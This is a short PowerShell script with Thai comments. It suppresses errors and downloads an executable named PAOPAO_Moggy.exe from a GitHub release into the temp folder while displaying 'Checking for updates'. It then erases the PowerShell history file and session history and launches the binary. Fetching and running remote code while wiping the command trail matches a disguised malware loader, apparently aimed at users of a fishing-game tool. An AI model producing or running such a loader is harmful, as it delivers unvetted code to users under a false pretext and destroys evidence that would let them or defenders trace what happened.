$ErrorActionPreference = "SilentlyContinue"

# 1. ข้อมูลไฟล์และลิงก์
$downloadUrl = "https://github.com/GRILLYje/Fishing_Moggy/releases/download/V1.0.0/PAOPAO_Moggy.exe" 
$tempPath = "$env:TEMP\PAOPAO_Moggy.exe"

# 2. เช็คไฟล์เก่าและลบทิ้ง
if (Test-Path $tempPath) {
    Remove-Item $tempPath -Force
}

Write-Host "Checking for updates" -ForegroundColor Cyan

# 3. ดาวน์โหลดไฟล์ (WebClient)
try {
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($downloadUrl, $tempPath)
    $webClient.Dispose()
} catch {
    Write-Host "An error occurred while downloading the file" -ForegroundColor Red
    Exit
}

# ==========================================
# 🌟 ส่วนที่เพิ่ม: ลบประวัติ PowerShell History
# ==========================================
try {
    # ค้นหาตำแหน่งไฟล์ประวัติ (ConsoleHost_history.txt) ของเครื่องนั้นๆ
    $historyPath = (Get-PSReadLineOption).HistorySavePath
    if (Test-Path $historyPath) {
        # ล้างข้อมูลในไฟล์ให้ว่างเปล่า
        Clear-Content -Path $historyPath
    }
    # ล้างประวัติใน Session ปัจจุบันด้วย
    Clear-History
} catch {
    # ถ้าเครื่องลูกค้าไม่มี PSReadLine หรือหาไฟล์ไม่เจอ ให้ข้ามไป
}
# ==========================================

# 4. รันโปรแกรม PAOPAO_Moggy
Write-Host "Launching" -ForegroundColor Green
Start-Process -FilePath $tempPath
